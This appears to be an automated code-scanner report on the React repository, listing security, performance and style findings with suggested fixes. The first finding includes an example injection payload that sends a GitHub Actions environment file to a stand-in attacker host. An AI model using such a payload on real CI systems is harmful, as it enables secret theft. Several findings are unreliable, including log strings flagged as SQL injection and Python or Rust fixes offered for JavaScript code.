findings.title: GitHub Actions Command Injection (Pull Request)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/runtime_build_and_test.yml`
**Line**: 534

**Vulnerable pattern detected**: `${{ github.event.inputs.commit_sha != '' && github.event.inputs.commit_sha || github.event.pull_request.head.sha || github.sha  }}`

**Code**:
```yaml
- run: echo ${{ github.event.inputs.commit_sha != '' && github.event.inputs.commit_sha || github.event.pull_request.head.sha || github.sha }} >> build/COMMIT_SHA
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.commit_sha != '' && github.event.inputs.commit_sha || github.event.pull_request.head.sha || github.sha  }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
findings.why_it_matters: Command injection in CI/CD pipelines can lead to complete repository compromise, secrets theft, and supply chain attacks affecting all users of your software.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
**Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: compiler/packages/babel-plugin-react-compiler/src/HIR/PrintHIR.ts:264

**Code snippet**:
```javascript
value = `[${terminal.id}] For init=bb${terminal.init} test=bb${terminal.test} loop=bb${terminal.loop} update=bb${terminal.update} fallthrough=bb${terminal.fallthrough}`;
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Insecure `Math.random()` used for cryptographic operation
findings.description:
`Math.random()` is not cryptographically secure and can be predicted by attackers.

**Analysis:**
🎯 Used for: cryptographic operation
📦 In function: `render`
findings.why_it_matters: Insecure random number generators (like Math.random or random.random) use predictable algorithms. Attackers can often guess the output and forge tokens, guess passwords, or bypass authentication.

findings.title: God class detected: CodePathState
findings.description:
Class 'CodePathState' shows signs of being a god class: very high method count (43), very large class (1218 LOC).

**Role Analysis:** Application — Standard application class

**Metrics:**
- Methods: 43
- Total complexity: 1
- Lines of code: 1218

📊 Threshold: 20 (adaptive) | Actual: 43 | Default would be: 20 | Profile: p90=3, p95=7, mean=1.3, n=888
findings.suggested_fix:
Refactor 'CodePathState' to reduce its responsibilities:
**Note:** This class was identified as Application (Standard application class). Thresholds adjusted accordingly.

1. **Extract related methods into separate classes**
- Look for method groups that work with the same data
- Create focused classes with single responsibilities
3. **Break down the large class (1218 LOC)**
- Split into smaller, focused classes
- Consider using composition over inheritance
- Extract data classes for complex state

**Apply SOLID principles:**
- Single Responsibility: Each class should have one reason to change
- Open/Closed: Extend behavior without modifying existing code
- Interface Segregation: Create specific interfaces
- Dependency Inversion: Depend on abstractions
findings.why_it_matters: God classes violate the Single Responsibility Principle. They are difficult to understand, test, and maintain. Changes to one part may unexpectedly affect other parts, leading to bugs and technical debt.

findings.title: Insecure deserialization: eval()
findings.description:
Deserializing user-controlled data with eval() can lead to Remote Code Execution.

**Analysis:**
🔧 Method: eval()
⚠️ Risk: Direct code execution
findings.suggested_fix: Validate schema before deserializing user input.
findings.why_it_matters:
Insecure deserialization can allow attackers to:
• Execute arbitrary code on the server
• Bypass authentication
• Perform denial of service
• Access sensitive data

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (line 82)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Large circular dependency web: 9 files
findings.description:
**Large dependency web:** 9 interconnected files form a strongly connected component.

**Files involved (showing 8/9):**
  • `CompilerError.ts`
  • `TypeErrors.ts`
  • `Types.ts`
  • `DefaultModuleTypeProvider.ts`
  • `Environment.ts`
  • `Globals.ts`
  • `HIR.ts`
  • `ObjectShape.ts`
  ...and 1 more

**Entry points (imported from outside the cycle):**
  • `HIR.ts` (imported 79 times)
  • `CompilerError.ts` (imported 55 times)
  • `Environment.ts` (imported 5 times)
  • `TypeErrors.ts` (imported 1 time)
  • `Types.ts` (imported 1 time)

**Weakest link to break:** `CompilerError.ts` → `TypeErrors.ts` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `CompilerError.ts` → `TypeErrors.ts` (weakest coupling: 1 imports)

Since `CompilerError.ts` only imports 1 symbol(s) from `TypeErrors.ts`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For large cycles:**
1. Extract shared interfaces/types into a new `types.py` or `interfaces.ts`
2. Apply the Dependency Inversion Principle
3. Consider restructuring into layers
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.title: Mutual recursion: 2 functions in call cycle (complexity 31)
findings.description: Mutual recursion detected: 2 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/compiler/packages/babel-plugin-react-compiler/src/Flood/Types.ts::printConcrete:194 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/compiler/packages/babel-plugin-react-compiler/src/Flood/Types.ts::printType:262. Aggregate complexity: 31.
findings.suggested_fix: Consider refactoring to eliminate direct mutual calls. Common strategies: merge the two functions, use a callback parameter, or introduce a shared data structure that both functions operate on.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Async call without await
findings.description:
Async function called without await - returns Promise/coroutine, not the actual value.

**Analysis:**
📦 In async function: `main`
🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

findings.title: Blocking call `writeFileSync` in async function
findings.description:
Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `update`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.writeFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: XSS: innerHTML assignment
findings.description:
[COMPOUND: 2 co-located issues] **Direct innerHTML assignment can lead to XSS vulnerabilities**

**Location**: fixtures/attribute-behavior/src/App.js:341

**Code snippet**:
```
container.innerHTML = html;
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

**Code snippet**:
```
container.innerHTML = html;
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Hook called conditionally: `useConditionalHook`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useConditionalHook`
📦 Component: `ComponentWithConditionalHook`
⚠️ Called inside `if/else/switch/ternary`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Express app missing helmet
findings.description:
[COMPOUND: 2 co-located issues] Helmet sets important security headers to protect against common attacks.

**App Analysis:**
📊 Security Score: 0%
🛣️ Routes: 7
❌ Missing: helmet, rate-limit, body-parser-limit, auth-middleware
findings.why_it_matters:
Without helmet, your app is missing:
• X-Content-Type-Options (prevents MIME sniffing)
• X-Frame-Options (prevents clickjacking)
• X-XSS-Protection (legacy XSS filter)
• Strict-Transport-Security (enforces HTTPS)
• Content-Security-Policy (prevents XSS)

findings.title: Async call without await
findings.description:
[COMPOUND: 2 co-located issues] Async function called without await - returns Promise/coroutine, not the actual value.

**Analysis:**
📦 In async function: `waitForWebpack`
🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

findings.title: Blocking call `readFileSync` in async function
findings.description:
[COMPOUND: 2 co-located issues] Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `waitForWebpack`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
[COMPOUND: 2 co-located issues] **dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: fixtures/fizz/src/Html.js:21

**Code snippet**:
```
dangerouslySetInnerHTML={{
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Excessive nesting: 16 levels

findings.suggested_fix:
Severely nested code. Apply multiple techniques:

2. Extract Method: pull nested blocks into functions

findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: XSS: React dangerouslySetInnerHTML
findings.description:
[COMPOUND: 2 co-located issues] **dangerouslySetInnerHTML can introduce XSS vulnerabilities**

**Location**: fixtures/ssr/src/components/Chrome.js:24

**Code snippet**:
```
dangerouslySetInnerHTML={{
```

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted data is included
in web pages without proper validation or escaping. Attackers can inject malicious
scripts that:
- Steal user session cookies
- Capture keystrokes and credentials
- Redirect users to malicious sites
- Deface the application

This vulnerability is classified as **CWE-79: Improper Neutralization of
Input During Web Page Generation ('Cross-site Scripting')**.
findings.suggested_fix:
**Recommended fixes**: 1. **Avoid dangerouslySetInnerHTML when possible**: ```jsx // Instead of:
// Use React's built-in escaping:
{userContent}
``` 2. **If HTML rendering is required**, sanitize first: ```jsx import DOMPurify from 'dompurify';
```
findings.why_it_matters: XSS vulnerabilities allow attackers to execute scripts in users' browsers, potentially stealing sensitive data or hijacking user sessions.

findings.title: Blocking call `readFileSync` in async function
findings.description:
[COMPOUND: 2 co-located issues] Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.

**Analysis:**
📦 In async function: `waitForWebpack`
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Spy functions (line 43)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Blocking call `readFileSync` in async function
findings.description: Synchronous blocking call inside async function will block the event loop, preventing other async tasks from running.
findings.suggested_fix:
Replace with async alternative: `await fs.promises.readFile()`

Example:
```python
# Instead of: time.sleep(1)
await asyncio.sleep(1)

# Instead of: requests.get(url)
async with aiohttp.ClientSession() as session:
async with session.get(url) as response:
data = await response.json()
```
findings.why_it_matters: Blocking calls in async code prevent the event loop from processing other tasks. This defeats the purpose of async/await and can cause the entire application to hang.

findings.title: Async call without await
findings.description:

**Analysis:**

🔍 Calls a function defined as async in this codebase
findings.suggested_fix: Add `await` before the async call.
findings.why_it_matters: Without await, you get a Promise object instead of the actual result.

findings.title: Excessive nesting: 11 levels
findings.description:
11 levels of nesting (threshold: 6).

**Analysis:**
Contains 1 match/switch level(s) (discounted from raw depth 12)

Threshold: 5 (adaptive) | Actual: 11 | Default would be: 5 | Profile: p90=4, p95=5, mean=1.6, n=7115
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Test code in production: 3 issues
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (lines 252, 287, 306)
⚠️ This file is imported by production code!
findings.suggested_fix:
Options:

1. **Move to test files:** If this is test code, move it to a test directory
2. **Use TYPE_CHECKING:** For type hints only, wrap imports in `if TYPE_CHECKING:`
3. **Environment check:** If needed at runtime, guard with environment variable

```python
# Instead of:
from unittest.mock import Mock

# Use:
from typing import TYPE_CHECKING
if TYPE_CHECKING:
from unittest.mock import Mock
```
findings.why_it_matters: This test code is imported by production code. Test dependencies add bloat, security risks, and can cause unexpected behavior in production.

findings.title: Hook called conditionally: `useOptimistic`
findings.description:
React hooks must be called in the exact same order on every render.

**Analysis:**
🪝 Hook: `useOptimistic`
⚠️ Called inside `if/else/switch/ternary`
findings.why_it_matters:
This violates the Rules of Hooks. React relies on the order of hook calls to track state correctly. Conditional/loop/nested hooks cause:
• State getting out of sync
• Crashes and rendering bugs
• Unpredictable behavior

findings.title: Empty catch block swallows exceptions
findings.description: [COMPOUND: 2 co-located issues] This catch block silently swallows exceptions, hiding potential bugs.
findings.suggested_fix:
Log the exception or handle it appropriately:
- Add logging to track failures
- Re-raise if recovery isn't possible
- Handle specific exception types
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Potential ReDoS vulnerability
findings.description:
[COMPOUND: 2 co-located issues] Regex with nested quantifiers may cause catastrophic backtracking, leading to denial of service.

**Analysis:**
🔍 Pattern issue: nested quantifiers detected
📝 Pattern: `^[a-z]+(-[a-z]+)*$`
findings.why_it_matters:
ReDoS attacks exploit regex backtracking to consume CPU:
• A malicious input can take exponential time to evaluate
• Single requests can freeze the server
• Input like 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!' on /(a+)+$/ can hang

findings.title: Circular dependency: 3 files
findings.description:
Mutual dependency between: Gating.ts ↔ Imports.ts ↔ Program.ts

**Weakest link to break:** `Gating.ts` → `Imports.ts` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `Gating.ts` → `Imports.ts` (weakest coupling: 1 imports)

Since `Gating.ts` only imports 1 symbol(s) from `Imports.ts`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For small cycles:**
1. Merge tightly coupled modules if they're always used together
2. Use TYPE_CHECKING (Python) or type-only imports (TS) for type hints
3. Extract common code to a third module
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Loose equality (==) used
findings.description:
== performs type coercion which can cause subtle bugs.

**Analysis:**
📦 In function: `getIdAt` (3 callers)
🌐 Route handler (processes user input)
findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.

findings.title: Empty catch block swallows exceptions
findings.description: This catch block silently swallows exceptions, hiding potential bugs.
findings.suggested_fix:
Log the exception or handle it appropriately:
- Add logging to track failures
- Re-raise if recovery isn't possible
- Handle specific exception types
findings.why_it_matters: Swallowed exceptions hide bugs and make debugging extremely difficult. When something fails silently, you may not know until much later.

findings.title: Hidden regex in loop: minimize
findings.description:
Function 'minimize' contains a loop and calls 'BabelPluginReactCompiler' which compiles a regex.

**Call chain:** BabelPluginReactCompiler → compileProgram → findProgramSuppressions

This may cause regex compilation on every iteration.
findings.suggested_fix:
Options:
1. Cache the compiled regex (lazy_static, OnceLock)
2. Pass pre-compiled regex as parameter
3. Restructure to compile once before loop
findings.why_it_matters: Hidden regex compilation across function boundaries is harder to spot but equally impactful.

findings.title: User input in log statement
findings.description: Unsanitized user input in logs can enable log forging.
findings.suggested_fix: Sanitize newlines and control chars from input.
findings.why_it_matters: Attackers can forge log entries.

findings.title: Insecure `Math.random()` used for OTP/verification code
findings.description:
[Non-production path] [COMPOUND: 3 co-located issues] `Math.random()` is not cryptographically secure and can be predicted by attackers.

**Analysis:**
🎯 Used for: OTP/verification code
📦 In function: `AnonymizePlugin`
findings.why_it_matters: Insecure random number generators (like Math.random or random.random) use predictable algorithms. Attackers can often guess the output and forge tokens, guess passwords, or bypass authentication.

findings.title: String concatenation in loop
findings.description:
[COMPOUND: 2 co-located issues] Variable 'imports' concatenated 2 times inside loop (started line 43).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Hardcoded timeout: 2 seconds
findings.description:
Magic timeout value `2000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 2 seconds
📍 Context: General timeout
📊 Same value used 5 times
findings.suggested_fix:
This timeout value appears 5 times. Extract to a centralized config:

```python
# config.py
TIMEOUT_2000MS = 2000  # 2 seconds

# usage
from config import TIMEOUT_2000MS
requests.get(url, timeout=TIMEOUT_2000MS/1000)
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: Hardcoded timeout: 10 seconds
findings.description:
Magic timeout value `10000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 10 seconds
📍 Context: General timeout
📊 Same value used 6 times
findings.suggested_fix:
This timeout value appears 6 times. Extract to a centralized config:

```python
# config.py
TIMEOUT_10000MS = 10000  # 10 seconds

# usage
from config import TIMEOUT_10000MS
requests.get(url, timeout=TIMEOUT_10000MS/1000)
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: Excessive nesting: 9 levels
findings.description:
9 levels of nesting (threshold: 6).

Threshold: 5 (adaptive) | Actual: 9 | Default would be: 5 | Profile: p90=4, p95=5, mean=1.6, n=7115
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Excessive nesting: 9 levels in validateChildKeys
findings.description:
9 levels of nesting (threshold: 6).

**Analysis:**
In function: `validateChildKeys`
High complexity: 12 (nesting compounds this)
Existing helpers that could reduce nesting: getIteratorFn, isValidElement, validateExplicitKey

Threshold: 5 (adaptive) | Actual: 9 | Default would be: 5 | Profile: p90=4, p95=5, mean=1.6, n=7115
findings.suggested_fix:
This function already has helpers like `getIteratorFn`. Consider:
1. Extract more nested blocks into similar helpers
2. Use guard clauses (early returns) to reduce nesting
3. Replace nested ifs with switch/match
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Mutual recursion: 3 functions in call cycle (complexity 29)
findings.description: Mutual recursion detected: 3 functions form a call cycle. Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/fixtures/legacy-jsx-runtimes/react-16/cjs/react-jsx-dev-runtime.development.js::error:86 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/fixtures/legacy-jsx-runtimes/react-16/cjs/react-jsx-dev-runtime.development.js::getComponentName:194 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/fixtures/legacy-jsx-runtimes/react-16/cjs/react-jsx-dev-runtime.development.js::printWarning:96. Aggregate complexity: 29.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Express app missing helmet
findings.description:
Helmet sets important security headers to protect against common attacks.

**App Analysis:**
📊 Security Score: 0%
🛣️ Routes: 4
❌ Missing: helmet, rate-limit, body-parser-limit, auth-middleware
findings.why_it_matters:
Without helmet, your app is missing:
• X-Content-Type-Options (prevents MIME sniffing)
• X-Frame-Options (prevents clickjacking)
• X-XSS-Protection (legacy XSS filter)
• Strict-Transport-Security (enforces HTTPS)
• Content-Security-Policy (prevents XSS)

findings.title: Hardcoded timeout: 2 seconds
findings.description:
Magic timeout value `2000` makes configuration and tuning difficult.

**Analysis:**
⏱️ Duration: 2 seconds
📍 Context: General timeout
📊 Same value used 5 times
findings.suggested_fix:
This timeout value appears 5 times. Extract to a centralized config:

```python
# config.py
TIMEOUT_2000MS = 2000  # 2 seconds

# usage
from config import TIMEOUT_2000MS
requests.get(url, timeout=TIMEOUT_2000MS/1000)
```
findings.why_it_matters: Hardcoded timeouts are hard to find, tune, and change across environments. Network timeouts especially need to be configurable based on deployment.

findings.title: String concatenation in loop

Variable 's' concatenated 3 times inside loop (started line 2083).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Global mutable variable: logMethod
findings.description:
Global mutable state 'logMethod' makes code hard to reason about.

**Impact Analysis:**
📊 Used 2 times in this file
⚠️ Module is imported by others - global may leak
findings.suggested_fix:
Cross-module globals are especially dangerous. Consider:
1. Export a getter/setter function instead: `getLogMethod()`, `setLogMethod()`
2. Encapsulate in a class with controlled access
3. Use dependency injection
findings.why_it_matters: Global state causes hidden dependencies between functions. Changes to globals can have unexpected effects throughout the codebase.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 862).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

Cycle: /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-devtools-shared/src/backendAPI.js::cleanup:179 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-devtools-shared/src/backendAPI.js::onDisconnect:199 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-devtools-shared/src/backendAPI.js::onInspectedElement:204 -> /tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-devtools-shared/src/backendAPI.js::onShutdown:190. Aggregate complexity: 10.
findings.suggested_fix: Break the cycle by extracting shared logic into a common helper, introducing an event system, or restructuring the call chain to be unidirectional.
findings.why_it_matters: Mutual recursion creates tight coupling between functions, making them impossible to understand, test, or refactor independently. It can also cause stack overflows if the recursion depth is unbounded.

findings.title: Potential SQL Injection (CWE-89)
findings.description:
[Non-production path] **Potential SQL Injection Vulnerability**

**Pattern detected**: JavaScript template literal with interpolation in SQL query

**Location**: packages/react-devtools-shared/src/devtools/ProfilerStore.js:283

**Code snippet**:
```javascript
`Unexpected profiling data update from renderer "${rendererID}"`,
```

SQL injection occurs when untrusted input is incorporated into SQL queries without
proper sanitization. An attacker could manipulate the query to:
- Access unauthorized data
- Modify or delete database records
- Execute administrative operations
- In some cases, execute operating system commands

This vulnerability is classified as **CWE-89: Improper Neutralization of Special
Elements used in an SQL Command ('SQL Injection')**.
findings.why_it_matters: SQL injection is one of the most dangerous vulnerabilities, allowing attackers to access, modify, or delete sensitive data in the database.

findings.title: Regex compiled inside loop
findings.description:
Regex compiled in loop (loop starts line 72).

**Performance impact:** Regex compilation is expensive. In a loop of N iterations, this costs N compilations instead of 1.
findings.suggested_fix:
Move regex compilation outside the loop:
```rust
let re = Regex::new(pattern)?;  // Before loop
for item in items {
re.is_match(item);  // Reuse
}
```
findings.why_it_matters: Regex compilation involves parsing and optimization. Doing it once instead of N times can dramatically improve performance.

findings.title: Excessive nesting: 9 levels
findings.description:
9 levels of nesting (threshold: 6).

**Analysis:**
Contains 1 match/switch level(s) (discounted from raw depth 10)

Threshold: 5 (adaptive) | Actual: 9 | Default would be: 5 | Profile: p90=4, p95=5, mean=1.6, n=7115
findings.suggested_fix:
Severely nested code. Apply multiple techniques:
1. Guard clauses: `if (!condition) return;`
2. Extract Method: pull nested blocks into functions
3. Replace conditionals with polymorphism
4. Use functional patterns (map/filter instead of nested loops)
findings.why_it_matters: Deep nesting makes code hard to read and maintain. Each level increases cognitive load exponentially.

findings.title: Callback hell (5 levels deep)

findings.why_it_matters: The 'pyramid of doom' hurts readability and makes error handling difficult. Each nesting level increases cognitive load.

findings.title: String concatenation in loop
findings.description:
Variable 'rects' concatenated 3 times inside loop (started line 349).

**Performance:** O(n²) time complexity. Each concatenation creates a new string and copies all previous characters.

For 1000 iterations, this copies ~500,000 characters instead of 1000.
findings.why_it_matters: String concatenation in loops creates O(n²) time complexity due to immutable string copying.

findings.title: Circular dependency: 3 files
findings.description:
Mutual dependency between: DOMPluginEventSystem.js ↔ ReactDOMEventListener.js ↔ ReactDOMEventReplaying.js

**Weakest link to break:** `DOMPluginEventSystem.js` → `ReactDOMEventListener.js` (1 import)
findings.suggested_fix:
🔗 **Best place to break:** `DOMPluginEventSystem.js` → `ReactDOMEventListener.js` (weakest coupling: 1 imports)

Since `DOMPluginEventSystem.js` only imports 1 symbol(s) from `ReactDOMEventListener.js`, consider:
- Move those symbols to a shared module
- Pass them as parameters instead of importing
- Use dependency injection

**For small cycles:**
1. Merge tightly coupled modules if they're always used together
2. Use TYPE_CHECKING (Python) or type-only imports (TS) for type hints
3. Extract common code to a third module
findings.why_it_matters: Circular dependencies make code harder to understand, test, and maintain. They can cause import errors at runtime and make it difficult to refactor individual modules.

findings.title: Structural bridge: `/tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-dom-bindings/src/server/ReactFizzConfigDOMLegacy.js::createRenderState:91` separates components of [13625, 12]
findings.description: `/tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/react/packages/react-dom-bindings/src/server/ReactFizzConfigDOMLegacy.js::createRenderState:91` is a structural bridge. Removing it would split the graph into components of sizes [13625, 12]. All communication between these components currently flows through this single node.
findings.suggested_fix: Reduce coupling through this node by introducing alternative call paths, extracting shared interfaces, or splitting the bridge function into independently accessible units.
findings.why_it_matters: A structural bridge is a single node whose failure disconnects entire subsystems. This creates fragile architecture where a bug, API change, or refactor in one function can cascade to all dependent components.

findings.title: Test code in production: 1 issue
findings.description:
Test utilities and patterns found in what appears to be production code.

**Found:**
• Mock/stub objects (line 77)
findings.suggested_fix:
Options:

